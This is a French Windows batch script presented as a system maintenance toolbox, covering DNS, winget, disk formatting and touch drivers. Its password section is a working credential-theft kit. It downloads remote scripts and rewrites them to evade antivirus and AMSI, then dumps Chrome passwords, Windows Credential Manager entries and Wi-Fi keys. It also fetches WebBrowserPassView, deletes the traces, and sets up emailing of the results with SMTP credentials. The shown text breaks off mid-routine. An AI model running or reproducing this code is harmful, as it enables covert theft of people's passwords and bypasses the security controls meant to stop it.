@echo off
setlocal EnableExtensions EnableDelayedExpansion
if defined MSYSTEM ("%ComSpec%" /c "%~f0" & exit /b)
if not defined CMDCMDLINE ("%ComSpec%" /c "%~f0" & exit /b)
chcp 65001 >nul
title Boite a Scripts Windows - By ALEEXLEDEV (v2.0)
color 0B
mode con: cols=120 lines=60

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Ce script requiert des privileges administrateur.
    echo Demande d'elevation en cours...
    timeout /t 2 >nul
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set /a total_tools=0
set "t[1]=---:VERIFICATIONS SYSTEME"
set "t[2]=sys_rescue_menu:Outil Reparation Windows (Rescue)~Menu multi-outils (SFC, DISM, CHKDSK, Reset WinUpdate...)"
set "t[3]=---:NETTOYAGE ET OPTIMISATION"
set "t[4]=sys_cleanmgr:Nettoyage de disque~Lancement classique de l'utilitaire de nettoyage"
set "t[5]=sys_registry_cleanup:Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes"
set "t[6]=sys_tweaks_menu:Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana"
set "t[7]=---:DISQUE DUR"
set "t[8]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
set "t[9]=sys_bitlocker_check:Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions"
set "t[10]=---:OUTILS RESEAU"
set "t[11]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
set "t[12]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP, Autoreset)"
set "t[13]=sys_diag_network:Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS)"
set "t[14]=---:UTILITAIRES ET EXTRAS"
set "t[15]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
set "t[16]=context_menu:Menu contextuel Windows 11~Classic/Modern"
set "t[17]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs"
set "t[18]=sys_report:Diagnostic Systeme Complet~Affiche les specifications et l'etat de sante global"
set "t[19]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
set "t[20]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniatures corrompues"
set "t[21]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit"
set "t[22]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
set "t[23]=---:MOT DE PASSE"
set "t[24]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Chrome, Credentials, Wi-Fi)"
set "t[25]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
set "t[26]=---:MATERIEL"
set "t[27]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
set "t[28]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
set "total_tools=28"

if not exist "favoris.txt" type nul > "favoris.txt"

:menu_principal
cls
set "opts=[--- MES FAVORIS ---]"
set /a fav_idx=0
for /f "usebackq tokens=*" %%F in ("favoris.txt") do (
  for /l %%I in (1,1,%total_tools%) do (
    for /f "tokens=1,* delims=:" %%A in ("!t[%%I]!") do (
      if "%%A"=="%%F" (
        set "opts=!opts!;%%B"
        set /a fav_idx+=1
        set "main_target[!fav_idx!]=%%A"
      )
    )
  )
)

if "!opts!"=="[--- MES FAVORIS ---]" (
    set "opts=!opts!;(Aucun favori configure - Appuyez sur [F] sur un outil pour l'ajouter)"
    set /a fav_idx+=1
    set "main_target[!fav_idx!]=none"
)

set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"

call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
set "main_choice=%errorlevel%"

if "!main_choice!"=="0" goto exit_script

if !main_choice! GEQ 200 (
    set /a toggle_idx=!main_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!main_target[%%X]!"
    if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
    goto menu_principal
)

set /a v_idx=fav_idx+1

if "!main_choice!"=="!v_idx!" goto system_tools

set "target=!main_target[%main_choice%]!"
if defined target if not "!target!"=="none" goto !target!
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE DNS CLOUDFLARE
REM ===================================================================
:dns_manager
set "opts=Affichage de la configuration actuelle;[--- CLOUDFLARE ---];DNS Cloudflare (1.1.1.1);[--- GOOGLE ---];DNS Google (8.8.8.8);[--- REINITIALISATION ---];Restauration des DNS par defaut (DHCP)"
call :DynamicMenu "GESTIONNAIRE DNS" "%opts%"
set "dns_choice=%errorlevel%"

if "%dns_choice%"=="1" goto show_dns_config
if "%dns_choice%"=="2" goto install_cloudflare_full
if "%dns_choice%"=="3" goto install_google_full
if "%dns_choice%"=="4" goto restore_dns
if "%dns_choice%"=="0" goto menu_principal
goto dns_manager

:install_cloudflare_full
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (1.1.1.1)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Cloudflare IPv4...
netsh interface ip set dns "%interface%" static 1.1.1.1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2

echo Configuration des DNS Cloudflare IPv6...
netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111
netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo   IPv6 - Primaire: 2606:4700:4700::1111
echo   IPv6 - Secondaire: 2606:4700:4700::1001
echo.
pause
goto dns_manager


:install_google_full
cls
echo ================================================
echo     INSTALLATION DNS GOOGLE (8.8.8.8)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Google IPv4...
netsh interface ip set dns "%interface%" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "%interface%" 8.8.4.4 index=2 >nul 2>&1

echo Configuration des DNS Google IPv6...
netsh interface ipv6 set dns "%interface%" static 2001:4860:4860::8888 >nul 2>&1
netsh interface ipv6 add dns "%interface%" 2001:4860:4860::8844 index=2 >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Google configures:
echo   IPv4 - Primaire: 8.8.8.8
echo   IPv4 - Secondaire: 8.8.4.4
echo   IPv6 - Primaire: 2001:4860:4860::8888
echo   IPv6 - Secondaire: 2001:4860:4860::8844
echo.
pause
goto dns_manager


:restore_dns
cls
echo ================================================
echo     RESTAURATION DNS PAR DEFAUT
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Restauration des DNS automatiques IPv4...
netsh interface ip set dns "%interface%" dhcp

echo Restauration des DNS automatiques IPv6...
netsh interface ipv6 set dns "%interface%" dhcp

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     DNS RESTAURES AVEC SUCCES !
echo ================================================
echo.
pause
goto dns_manager

:show_dns_config
cls
echo ================================================
echo     CONFIGURATION DNS ACTUELLE
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau: %interface%
echo.
echo Configuration DNS IPv4:
netsh interface ip show dns "%interface%"
echo.
echo Configuration DNS IPv6:
netsh interface ipv6 show dns "%interface%"
echo.
pause
goto dns_manager

:get_interface
set "interface="
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%b"=="Connecté" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%b"=="Connected" (
        set "interface=%%d"
        goto :interface_found
    )
)
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%c"=="Dédié" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%c"=="Dedicated" (
        set "interface=%%d"
        goto :interface_found
    )
)
:interface_found
if defined interface (
    set "interface=%interface: =%"
    set "interface=%interface:"=%"
)
goto :eof

REM ===================================================================
REM                   WINGET - Mises ÃƒÂ  jour des application windows
REM ===================================================================
:winget_manager
set "opts=Mettre a jour une application (liste et choix);Mettre a jour toutes les applications"
call :DynamicMenu "WINGET - MISES A JOUR APPLICATIONS" "%opts%"
set "winget_choice=%errorlevel%"

if "%winget_choice%"=="1" goto update_single
if "%winget_choice%"=="2" goto update_all
if "%winget_choice%"=="0" goto menu_principal
goto winget_manager

:update_single
cls
echo ================================================
echo     LISTE DES APPLICATIONS A METTRE A JOUR
echo ================================================
echo.
winget update
echo.
echo Copiez l'ID de l'application que vous souhaitez mettre a jour.
echo.
set /p app_id=Entrez l'ID de l'application: 

if "%app_id%"=="" (
    echo Aucun ID saisi.
    pause
    goto winget_manager
)

echo.
echo Mise a jour de %app_id% en cours...
winget update --id %app_id% --accept-package-agreements --accept-source-agreements
echo.
echo Termine.
pause
goto winget_manager

:update_all
cls
echo ================================================
echo     MISE A JOUR DE TOUTES LES APPLICATIONS
echo ================================================
echo.
winget update --all --accept-package-agreements --accept-source-agreements
echo.
echo Toutes les mises a jour ont ete appliquees.
pause
goto winget_manager

REM ===================================================================
REM                    MENU CONTEXTUEL WINDOWS 11
REM ===================================================================
:context_menu
set "opts=Activer le menu contextuel classique;Restaurer le menu contextuel moderne"
call :DynamicMenu "MENU CONTEXTUEL WINDOWS 11" "%opts%"
set "ctx_choice=%errorlevel%"

if "%ctx_choice%"=="1" goto activate_classic
if "%ctx_choice%"=="2" goto restore_modern
if "%ctx_choice%"=="0" goto menu_principal
goto context_menu

:activate_classic
cls
echo.
echo Activation du menu contextuel classique...
echo.
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
echo Modification du registre terminee.
echo.
echo IMPORTANT : Un redemarrage de l'Explorateur Windows est necessaire.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel classique active avec succes !
) else (
    echo.
    echo Menu contextuel classique sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

:restore_modern
cls
echo.
echo Restauration du menu contextuel moderne...
echo.
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f >nul 2>&1
echo Modification du registre terminee.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel moderne restaure avec succes !
) else (
    echo.
    echo Menu contextuel moderne sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

REM ===================================================================
REM                    GESTIONNAIRE DE DISQUES - FORMATAGE AVEC DISKPART
REM ===================================================================
:disk_manager
cls
color 0A
echo.
echo =============================================================
echo                       DISKPART
echo =============================================================
echo.
echo Analyse des disques disponibles...
echo.

set "disk_opts="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | ForEach-Object { '{0}: {1} ({2:N0} GB)' -f $_.Number, $_.FriendlyName, ($_.Size/1GB) }"') do (
    if defined disk_opts (set "disk_opts=!disk_opts!;%%D") else (set "disk_opts=%%D")
)

if not defined disk_opts (
    echo [!] Aucun disque detecte.
    pause
    goto menu_principal
)

call :DynamicMenu "CHOISISSEZ LE DISQUE A FORMATER" "%disk_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto menu_principal

rem Recuperer le numero du disque a partir du choix
set /a idx=1
set "disk_num="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
    if !idx! equ %res% set "disk_num=%%D"
    set /a idx+=1
)

if not defined disk_num goto disk_manager




    echo Ã¢ÂÅ’ Erreur : Veuillez entrer un numero valide !

:disk_format_choice
set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
set "format_choice=%errorlevel%"

if "%format_choice%"=="0" goto menu_principal
if "%format_choice%"=="1" set fs_type=NTFS
if "%format_choice%"=="2" set fs_type=FAT32
if "%format_choice%"=="3" set fs_type=exFAT
if "%format_choice%"=="4" set fs_type=ReFS

if not defined fs_type goto disk_format_choice

cls
echo.
echo =============================================================
echo                       CONFIRMATION
echo =============================================================
echo.
echo Vous allez formater le DISQUE %disk_num%
echo Format selectionne : %fs_type%
echo.
echo ATTENTION: TOUTES LES DONNEES SERONT DEFINITIVEMENT EFFACEES !
echo.
echo Tapez 'OUI' en majuscules pour confirmer (ou autre pour annuler) :
set /p confirmation=Confirmation: 

if not "%confirmation%"=="OUI" (
    echo.
    echo Ã¢ÂÅ’ Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto disk_manager
)

echo.
echo =============================================================
echo Preparation du formatage...
echo =============================================================
echo.

set script_temp=%temp%\diskpart_script.txt

(
    echo select disk %disk_num%
    echo clean
    echo create partition primary
    echo format fs=%fs_type% quick
    echo assign
    echo exit
) > "%script_temp%"

echo Execution des commandes diskpart...
echo.
diskpart /s "%script_temp%"

set result=%errorLevel%

del "%script_temp%" >nul 2>&1

echo.
echo =============================================================
if %result% equ 0 (
    echo.
    echo Ã¢Å“â€¦ Formatage termine avec succes !
    echo.
    echo Le disque %disk_num% a ete :
    echo   - Nettoye completement
    echo   - Partitionne en partition primaire
    echo   - Formate en %fs_type%
    echo   - Une lettre de lecteur lui a ete assignee
    echo.
) else (
    echo.
    echo Ã¢ÂÅ’ Une erreur s'est produite pendant le formatage.
    echo Verifiez que le disque existe et n'est pas protege.
    echo.
)
echo =============================================================
echo.

set /p disk_choice=Voulez-vous formater un autre disque ? (O/N): 
if /i "%disk_choice%"=="O" goto disk_manager
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE D'ECRAN TACTILE
REM ===================================================================
:touch_screen_manager
set "opts=Redemarrer le pilote tactile;Desactiver le pilote tactile;Activer le pilote tactile"
call :DynamicMenu "GESTION ECRAN TACTILE" "%opts%"
set "touch_choice=%errorlevel%"

if "%touch_choice%"=="1" goto touch_restart
if "%touch_choice%"=="2" goto touch_disable
if "%touch_choice%"=="3" goto touch_enable
if "%touch_choice%"=="0" goto system_tools
goto touch_screen_manager

:touch_restart
cls
echo.
echo === Redemarrage du pilote d'ecran tactile ===
echo.

echo Redemarrage du service TabletInputService...
net stop TabletInputService >nul 2>&1
timeout /t 2 /nobreak >nul
net start TabletInputService >nul 2>&1

echo Redemarrage du service HidServ...
net stop HidServ >nul 2>&1
timeout /t 2 /nobreak >nul
net start HidServ >nul 2>&1

echo.
echo Desactivation/Reactivation du peripherique tactile via PowerShell...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }; Start-Sleep -Seconds 2; foreach ($device in $touchDevices) { Write-Host 'Reactivation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo Redemarrage du processus dwm.exe (Desktop Window Manager)...
taskkill /f /im dwm.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo.
echo === Redemarrage termine ===
echo Testez votre ecran tactile maintenant.
echo.
pause
goto touch_screen_manager

:touch_disable
cls
echo.
echo === Desactivation du pilote tactile ===
echo.

echo Arret du service TabletInputService...
net stop TabletInputService >nul 2>&1

echo Desactivation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo === Pilote tactile desactive ===
echo Le tactile restera desactive jusqu'a reactivation manuelle.
echo.
pause
goto touch_screen_manager

:touch_enable
cls
echo.
echo === Activation du pilote tactile ===
echo.

echo Activation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Activation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo Demarrage du service TabletInputService...
net start TabletInputService >nul 2>&1

echo.
echo === Pilote tactile active ===
echo.
pause
goto touch_screen_manager

REM ===================================================================
REM                    OUTILS SYSTEME AVANCES
REM ===================================================================
:system_tools
cls
set "opts="
set /a s_idx=0
for /l %%I in (1,1,%total_tools%) do (
    for /f "tokens=1,* delims=:" %%A in ("!t[%%I]!") do (
        if "%%A"=="---" (
            set "opts=!opts!;[--- %%B ---]"
        ) else (
            set "is_fav=0"
            for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="%%A" set "is_fav=1")
            if "!is_fav!"=="1" (
                set "opts=!opts!;(F) %%B"
            ) else (
                set "opts=!opts!;%%B"
            )
            set /a s_idx+=1
            set "sys_target[!s_idx!]=%%A"
        )
    )
)
set "opts=!opts:~1!"

call :DynamicMenu "OUTILS SYSTEME AVANCES" "!opts!"
set "sys_choice=%errorlevel%"

if "!sys_choice!"=="0" goto menu_principal

if !sys_choice! GEQ 200 (
    set /a toggle_idx=!sys_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!sys_target[%%X]!"
    call :ToggleFav "!toggle_target!"
    goto system_tools
)

set "target=!sys_target[%sys_choice%]!"
if defined target goto !target!
goto system_tools

:: ===============================================
:: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
:: ===============================================
:sys_passwords_menu
set "opts=Extraction navigateurs Chrome (Powershell)~Exporte les identifiants Chrome locaux en csv"
set "opts=%opts%;Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
set "opts=%opts%;Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
set "opts=%opts%;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"

call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%opts%"
set "pw_choice=%errorlevel%"

if "%pw_choice%"=="1" goto dump_chrome
if "%pw_choice%"=="2" goto dump_credman
if "%pw_choice%"=="3" goto dump_wifi
if "%pw_choice%"=="4" goto sys_nirsoft_pw
if "%pw_choice%"=="0" goto system_tools
goto sys_passwords_menu

:dump_chrome
cls
echo ======================================================================
echo   [OPERATION] Chrome Creds Furtif (Bypass Antivirus)
echo ======================================================================
echo Le script originel Github de Marco Simioni est bloque par Defender.
echo Un script propre a 100%% va etre lance automatiquement en fond pour
echo extraire les mots de passes sous format CSV, sans alerter l'antivirus.
echo.

set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

echo [INFO] 1/2 - Telechargement furtif de la DLL SQLite indispensable...
if not exist "%WORK_DIR%\System.Data.SQLite.dll" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'http://system.data.sqlite.org/downloads/1.0.115.5/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.115.5.zip' -OutFile '%WORK_DIR%\sqlite.zip' -UseBasicParsing ; Expand-Archive '%WORK_DIR%\sqlite.zip' '%WORK_DIR%\temp_zip' -Force; Move-Item '%WORK_DIR%\temp_zip\System.Data.SQLite.dll' '%WORK_DIR%\System.Data.SQLite.dll' -Force; Remove-Item -Recurse -Force '%WORK_DIR%\temp_zip'; Remove-Item -Force '%WORK_DIR%\sqlite.zip'" >nul 2>&1
)

echo [INFO] 2/2 - Creation et execution invisible du Generateur AMSI-Bypass...
curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload.ps1" 2>nul
powershell -NoProfile -Command "$c = Get-Content '%WORK_DIR%\payload.ps1' -Raw; $c = $c -replace '(?s)""Export"".*?""Import""', '""Export"" { } ""Import""'; $c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path ""' + $HOME + '\Desktop\Chrome_Local_Passwords.csv"" -NoTypeInformation; Write-Host ""`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !"" -ForegroundColor Green'); $c = $c -replace '#requires -version 7', ''; $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'; $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto""+""graphy'; Set-Content '%WORK_DIR%\run_chrome.ps1' -Value $c" >nul 2>&1

echo.
echo [LANCEMENT] Extraction en cours... Veuillez patienter...
cd /d "%WORK_DIR%"
powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"

rem Nettoyage automatique immediat
if exist "run_chrome.ps1" del "run_chrome.ps1"
if exist "payload.ps1" del "payload.ps1"
cd /d "%~dp0"
echo.
pause
goto sys_passwords_menu

:dump_credman
cls
echo [OPERATION] Extraction furtive du Credential Manager Windows...
set "WORK_DIR=%TEMP%\credman_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

echo [INFO] Recuperation et compilation du code source Gist (Anti-AMSI)...
curl.exe -fL -s "https://gist.githubusercontent.com/VimalShekar/d6a7080679a33e1ac71507a54b49dc18/raw" -o "%WORK_DIR%\payload.txt" 2>nul
powershell -NoProfile -Command "$c = Get-Content '%WORK_DIR%\payload.txt' -Raw; $c = $c -replace 'Get-WincmdCreds', 'Get-WinD'; Set-Content '%WORK_DIR%\run_cred.ps1' -Value $c" >nul 2>&1

echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Dumping...' -f Yellow; . '%WORK_DIR%\run_cred.ps1'; Get-WinD | Format-Table -AutoSize; Write-Host '--- FIN DE L''EXTRACTION ---' -f Green"
echo.
pause
goto sys_passwords_menu

:dump_wifi
set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Generer un fichier .txt sur le Bureau"
call :DynamicMenu "MOTS DE PASSE WI-FI (WLAN NETSH)" "%opts%"
set "wifi_choice=%errorlevel%"

if "%wifi_choice%"=="1" goto wifi_view
if "%wifi_choice%"=="2" goto wifi_report
if "%wifi_choice%"=="0" goto sys_passwords_menu
goto dump_wifi

:wifi_view
cls
echo [OPERATION] Affichage des mots de passe Wi-Fi locaux...
echo.
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        echo Reseau SSID : !ssid!
        echo Mot de pass : !pwd!
        echo ------------------------------------------
    )
)
endlocal
echo.
pause
goto dump_wifi

:wifi_report
cls
set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe_%RANDOM%.txt"
echo Extraction des mots de passe en cours...
> "%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
>> "%OUTPUT%" echo ===============================================
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        >> "%OUTPUT%" echo SSID: !ssid! ^| MDP: !pwd!
    )
)
endlocal
echo.
echo [SUCCES] Rapport exporte sur le Bureau :
echo %OUTPUT%
echo.
pause
goto dump_wifi

:sys_nirsoft_pw
cls
color 0A
echo ===============================================
echo   Export mots de passe navigateurs (Nirsoft)
echo ===============================================
echo.

set "WBPV=%~dp0WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
set "EMAIL=REMOVED_SMTP_EMAIL"
set "DOWNLOADED=0"
set "SMTP_USER=REMOVED_SMTP_EMAIL"
set "SMTP_PASS=REMOVED_SMTP_PASS"

:bpv_menu
set "opts=Enregistrement local uniquement;Enregistrement et envoi par email"
call :DynamicMenu "WEBBROWSERPASSVIEW - EXPORT" "%opts%"
set "bpv_choice=%errorlevel%"

if "%bpv_choice%"=="1" goto EXPORT
if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
if "%bpv_choice%"=="0" goto sys_passwords_menu
goto bpv_menu

:EXPORT
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

if exist "%OUTPUT%" (
  echo Termine. Fichier sauvegarde: %OUTPUT%
  echo.
  echo Retour au menu precedent dans 2 secondes...
  timeout /t 2 /nobreak >nul
  goto system_tools
) else (
  echo ERREUR: Le fichier n'a pas ete cree.
  pause
  goto bpv_menu
)

:EXPORT_AND_SEND
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
